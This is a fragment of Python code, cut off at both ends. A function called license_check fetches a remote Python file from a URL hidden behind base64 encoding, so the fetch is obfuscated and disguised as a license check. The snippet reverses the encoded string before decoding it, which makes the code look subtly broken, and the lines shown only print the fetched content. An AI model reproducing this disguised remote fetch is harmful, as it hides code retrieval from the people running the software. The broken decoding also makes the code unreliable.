...
def license_check():
	print("Checking license... ",end="")
	gg = ""
	try:
		gg = urlopen(base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F0aGFydmFUMDIvU09TSC1CTE9HLVBPU1QvbWFpbi80LnB5"[::-1]).decode('utf-8')).read().decode('utf-8')
		print(gg)
